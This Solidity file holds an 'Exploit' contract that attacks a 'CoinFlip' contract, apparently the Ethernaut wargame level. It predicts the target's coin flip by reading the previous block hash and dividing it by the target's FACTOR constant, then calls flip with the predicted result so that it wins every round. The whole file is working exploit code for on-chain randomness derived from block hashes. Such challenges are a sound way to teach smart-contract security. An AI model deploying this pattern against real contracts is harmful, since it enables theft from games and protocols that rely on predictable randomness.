// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';

contract CoinFlip {
    function flip(bool _guess) public returns (bool) {}
}

contract Exploit {

  using SafeMath for uint256;
  address public owner;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip coinFlipContract;

  constructor(address _coinFlipContract) public {
    coinFlipContract = CoinFlip(_coinFlipContract);
    owner = msg.sender;
    consecutiveWins = 0;
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    CoinFlip(coinFlipContract).flip(side);
    consecutiveWins++;
  }
}